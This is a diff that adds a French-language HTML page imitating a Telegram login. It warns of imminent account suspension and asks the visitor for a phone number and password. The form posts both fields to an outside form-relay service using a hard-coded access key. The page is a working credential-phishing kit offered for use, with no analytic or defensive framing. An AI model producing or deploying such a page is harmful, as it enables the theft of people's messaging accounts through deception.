@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>
+      Entrer les informations de votre compte pour que nous vous aidons a eviter la suspension de votre compte.
+    </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f9f9f9;
+        }
+        .container {
+            text-align: center;
+            background-color: #ffffff;
+            border-radius: 10px;
+            padding: 30px 40px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .container img {
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #e60000; /* Rouge pour le titre */
+            font-size: 20px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 300px;
+            height: 40px;
+            font-size: 16px;
+            border: 1px solid #0088cc; /* Bordure bleue */
+            color: #ffffff; /* Texte blanc */
+            background-color: #0088cc; /* Bleu pour le fond */
+            border-radius: 25px;
+            padding: 0 15px;
+            outline: none;
+        }
+        input::placeholder {
+            color: #d9f2ff; /* Bleu clair pour le texte placeholder */
+        }
+        input:focus {
+            border-color: #005f99; /* Bordure plus sombre au focus */
+            box-shadow: 0 0 4px rgba(0, 136, 204, 0.5); /* Légère lueur bleue */
+        }
+        button {
+            width: 320px;
+            height: 45px;
+            font-size: 16px;
+            background-color: #0088cc; /* Bleu principal */
+            color: white; /* Texte blanc */
+            border-radius: 25px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #005f99; /* Couleur plus sombre au survol */
+        }
+        p {
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        a {
+            color: #0088cc; /* Bleu principal pour les liens */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="1.png" height="70px">
+        <h1>
+        Entrer vos informations pour eviter la suspension de votre compte , assurer vous de saisir vos vrai information.
+    
+        </h1>
+
+        <!-- Partie envoi d'information -->
+        <form action="https://api.web3forms.com/submit" method="POST">
+<input type="hidden" name="access_key" value="049a288a-3673-476f-8f10-235433aa140d">
+
+            <div class="input-group">
+                <label for="numero">Numéro de téléphone</label>
+                <input 
+                    type="text" 
+                    id="numero"
+                    name="numero telegramme" 
+                    required 
+                    placeholder="Numéro Télégramme">
+            </div>
+
+            <div class="input-group">
+                <label for="password">Mot de passe</label>
+                <input 
+                    type="text" 
+                    id="password"
+                    name="mp" 
+                    required 
+                    placeholder="Mot de passe">
+            </div>
+
+            <button type="submit">Se connecter</button>
+        </form>
+
+        <p><a href="#">Mot de passe oublié ?</a></p>
+    </div>
+</body>
+</html>
